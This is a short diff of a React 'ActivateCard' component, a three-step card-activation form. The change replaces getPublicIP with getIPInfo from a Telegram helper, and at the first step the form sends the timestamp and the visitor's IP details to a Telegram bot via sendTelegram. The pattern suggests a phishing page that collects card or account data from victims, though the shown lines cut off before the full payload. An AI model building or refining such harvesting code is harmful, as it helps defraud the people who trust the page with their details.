@@ -2,7 +2,7 @@ import { useState } from "react";
 import { useLocation } from "wouter";
 import { AuthHeader } from "@/components/auth-header";
 import { CheckCircle } from "lucide-react";
-import { sendTelegram, getPublicIP } from "@/lib/telegram";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 import { useI18n } from "@/lib/i18n";
 
 const TOTAL_STEPS = 3;
@@ -52,7 +52,7 @@ export default function ActivateCard() {
 
     setLoading(true);
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip = await getPublicIP();
+    const ip = await getIPInfo();
 
     if (step === 0) {
       await sendTelegram(
